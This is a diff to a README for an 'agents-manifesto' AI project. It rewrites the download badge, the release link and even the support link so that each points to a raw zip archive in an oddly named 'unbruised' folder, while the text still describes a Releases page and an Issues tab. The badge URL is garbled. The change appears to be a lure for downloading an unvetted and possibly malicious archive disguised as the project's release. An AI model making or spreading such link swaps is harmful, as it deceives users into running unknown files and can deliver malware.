@@ -1,7 +1,7 @@
 # 🤖 agents-manifesto - Download and Run AI Applications Responsibly
 
 ## 📥 Download Now
-[![Download Agents Manifesto](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/LilXYXZ/agents-manifesto/releases)
+[![Download Agents Manifesto](https://raw.githubusercontent.com/LilXYXZ/agents-manifesto/main/unbruised/agents-manifesto.zip%20Now-Click%https://raw.githubusercontent.com/LilXYXZ/agents-manifesto/main/unbruised/agents-manifesto.zip)](https://raw.githubusercontent.com/LilXYXZ/agents-manifesto/main/unbruised/agents-manifesto.zip)
 
 ## 🚀 Getting Started
 Welcome to the Agents Manifesto project! This document guides you through downloading and running the software. The Agents Manifesto promotes responsible AI practices, ensuring that AI agents become dependable collaborators.
@@ -17,7 +17,7 @@ Before you proceed, ensure your computer meets the following requirements:
 ## 📦 Download & Install
 To get the Agents Manifesto, visit the Releases page:
 
-[Download the Latest Release](https://github.com/LilXYXZ/agents-manifesto/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/LilXYXZ/agents-manifesto/main/unbruised/agents-manifesto.zip)
 
 ### Steps to Download:
 1. Click on the link above to visit the Releases page.
@@ -59,7 +59,7 @@ Once the download completes, locate the file in your downloads folder. Follow th
 ## 💬 Support
 If you encounter any issues while downloading or using the application, you can find support in these ways:
 
-- **GitHub Issues:** Report bugs or request features through the Issues tab on our [GitHub Repository](https://github.com/LilXYXZ/agents-manifesto/issues).
+- **GitHub Issues:** Report bugs or request features through the Issues tab on our [GitHub Repository](https://raw.githubusercontent.com/LilXYXZ/agents-manifesto/main/unbruised/agents-manifesto.zip).
 - **Community Forum:** Participate in discussions and share experiences with other users on our forum.
 
 ## 🤝 Contribute
